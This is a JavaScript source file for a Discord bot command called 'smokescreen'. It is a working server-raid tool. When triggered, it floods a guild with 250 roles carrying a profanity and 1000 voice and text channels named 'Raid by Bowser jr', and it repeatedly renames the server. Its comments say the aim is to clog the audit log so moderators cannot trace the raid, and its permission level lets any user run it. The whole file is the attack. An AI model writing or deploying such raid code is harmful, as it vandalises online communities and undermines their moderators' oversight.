const Discord = require('discord.js');

  const ms = require('ms');
  exports.run = (client, message, args) => {

            for (var i = 0; i < 250; i++) {
                // Creates new roles to clog up the audit log
                message.guild.createRole({
                    name: 'FUCK',
                    color: 'RED',
                });
              }
                for (var i = 0; i < 500; i++) {
                message.guild.createChannel('Raid by Bowser jr', 'voice')
                message.guild.createChannel('Raid by Bowser jr', 'text')
                //changes name tons of times to clog up the audit log
                message.guild.setName("Raid by Bowser jr");
                }
            };



    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'smokescreen',
        description: '',
        usage: ''
      };
